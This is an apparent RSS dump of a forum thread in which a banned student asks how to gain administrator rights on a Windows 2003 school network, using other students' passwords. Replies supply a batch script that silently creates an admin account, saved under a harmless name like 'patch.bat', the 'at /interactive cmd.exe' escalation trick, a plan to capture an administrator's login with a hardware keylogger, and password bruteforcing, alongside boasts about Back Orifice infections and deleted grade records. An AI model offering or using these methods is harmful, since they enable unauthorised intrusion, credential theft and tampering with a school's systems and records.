channel.title: School networks
channel.description:
Hey all,
Okay, what's the most easiest way to get admin rights on a school network running win2k3 server? My account got banned yesterday (was playing quake 2 hehe). I still got alot of passwords from other students though, but how do i get admin rights (only in cmd needed). Yes, i know how to unblock and shit, but are there any cool tricks without safe mode/recover disk (we got network pc's, without cd drive, without gui os and stuff :P . When you log on you use remote desktop)
Any tricks? :D
-S!ms

item.title: School networks
item.dc:creator: @S_ms S!ms
item.description:
@S_ms wrote:

9xxx > 11xxx. They won’t notice

Read full topic

item.title: School networks
item.dc:creator: @flamed_fury1 flamed fury1
item.description:
@flamed_fury1 wrote:

S!ms if you go to the type of school where all the usernames are like 01smith and 02bob…
It’s so easy to make an account that fits in.

Read full topic

item.title: School networks
item.dc:creator: @S_ms S!ms
item.description:
@S_ms wrote:

Damn, I just tried the AT command: access denied. They’re smarter than i though And yea, i know they see all the users, but when i make a new admin account, i’ll take a name of an admin. I’m not that dumb actually

Any other tricks?

Read full topic

item.title: School networks
item.dc:creator: @Morgoth Morgoth
item.description:
@Morgoth wrote:

[quote=“aps, post:23, topic:30637”]i got into my schools server, deleted everything…

I mean accounts, grades, everything…

I was in so much trouble, but hey, its over, whatever dont kill you makes you stronger, plus it wasnt that bad…

LOL i just realized what i shoulda done[/quote]

That reminds me how some guys in school burned the gradebook upon the ice of frozen river. That was like 10 years ago, therefore all the grades were written in a paper book.

The real fun was in year 1998 when Back Orifice came around. About 1 of 10 computers were infected with this back door. Of course all the compurers in school had to be infceted manually. When the teachers had some courses in the computer room, we randomly rebooted their comps, typed all kind of stuff on their screens. That was fun. Or just find a random infected computer, upload a small ms-dos proggy to their start up folder. And when they boot, their pc-speaker plays random tunes all the time. Could be quite frustrating Ehh… old good days

Read full topic

who ever the geeky guy is (the guy who fixs the pc when some girl drops nail varnish on the monitor…) when he goes for a tea break boot his door down with a cd with a keylodgers uve set up wait for him to use it and bam or just hide in a cuboard wait for him to type it in… and peak over his shoulder

item.title: School networks
item.dc:creator: @marluxia marluxia
item.description:
@marluxia wrote:

@echo off
set /p name=account name: 
net user %name% /add /expires:never > nul
net localgroup "Administrators" /add %name% > nul
echo Account %name% made :)
pause

save as something subtle like “patch.bat” or something that admins won’t check

Something like that will make a admin account?

Read full topic

item.title: School networks
item.dc:creator: @MidGuardian MidGuardian
item.description:
@MidGuardian wrote:

I dont know how to unblock but admins can see all the users. Unless u make an account on a new network i suggest dont make a user/admin.

Read full topic

item.title: School networks
item.dc:creator: @flamed_fury1 flamed fury1
item.description:
@flamed_fury1 wrote:

S!ms:

hmm, i believe you mean that at HH:MM /interactive “cmd.exe” thingy? Thanks anyway, i’ll try it tomorrow

Once you do that, use the root cmd to open task manager. Then kill explorer.exe process and then run explorer.exe from task manager.
You should then switch over to root admin.

But that’s for XP… Might work though

Read full topic

item.title: School networks
item.dc:creator: @S_ms S!ms
item.description:
@S_ms wrote:

I don’t want any social stuff… and the admins are logged on on the same server as i am. The usernames are easy to find (i got a full user list) etc. But is there any way to log on to a system with admin rights w/o hacking too much?

And hey, please don’t say it will get me into trouble, i know, and i’m not stupid.

Read full topic

item.title: School networks
item.dc:creator: @Mr.Chris Mr.Chris
item.description:
@Mr.Chris wrote:

Firstly, it is a USB port…

Secondly, it is a keylogger…

Thirdly, keylogging wont do jack…

Fourthly, if you do not know anything about the subject, don’t post.

Read full topic

item.title: School networks
item.dc:creator: @parad0x parad0x_
item.description:
@parad0x wrote:

Buy a keelog (keelog.com) walk up to a computer, and plug it into the ps2 port between the computer and the mouse.
Restart the computer and put it in safe mode and pull the ethernet cord out and complain to an admin that the computer’s “not working”.
They will log in with admin username and pass, and you go home with your keelog and get their login info.
From there you can gradually gain access to the server with other programs, sql injections, etc.

Read full topic

item.title: School networks
item.dc:creator: @Morgoth Morgoth
item.description:
@Morgoth wrote:

If it’s remote desktop, then probably the rights are set so, that only certain set of accounts can connect to them. And admin accounts are not among them. That would be secure, because even in case if someone finds out the admin username and password, they can’t do anything, because admin can log in only locally.
Ok, here is the way: catch the admin, and beat him, until he/she reveals all access data, gives they key to the room, where the server is stored.
As I remember, when win NT was around, there were progs (freely downloadable) that allowed to read certain data from the registry, and then bruteforce any passwrods from that data. It took for us like half a day on Pentium 200 to crack the password. But win 2k3 at least should be more secure than the ancient thing called win NT…

Read full topic

I know what you’re looking for, I’m just expressing that it’s a stupid idea.

However, you already know about the “network cable unplug thingy” which shows you are googling - you’ll find people on here don’t know shit and Google does, so keep using that.

By the way, the network cable trick won’t help you unblock your account.
